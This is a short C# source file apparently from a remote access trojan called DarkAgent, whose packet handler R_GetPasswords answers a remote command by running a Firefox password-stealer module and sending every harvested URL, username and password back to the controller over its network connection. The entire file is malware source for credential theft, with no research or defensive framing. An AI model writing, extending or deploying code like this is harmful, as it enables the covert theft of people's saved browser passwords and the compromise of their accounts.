using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;
using DarkAgent_Client.src.Features.Stealers.Firefox;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_GetPasswords : ReceiveBasePacket
    {
        public R_GetPasswords(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }


        public override void Read()
        {
        }

        public override void Run()
        {
            List<PasswordInfo> Firefox_Passwords = Firefox.GetFirefoxPasswords();
            for(int i = 0; i < Firefox_Passwords.Count; i++)
                Client.SendPacket(new S_Password(Client, Firefox_Passwords[i].URL, Firefox_Passwords[i].Username, Firefox_Passwords[i].Password));
        }
    }
}
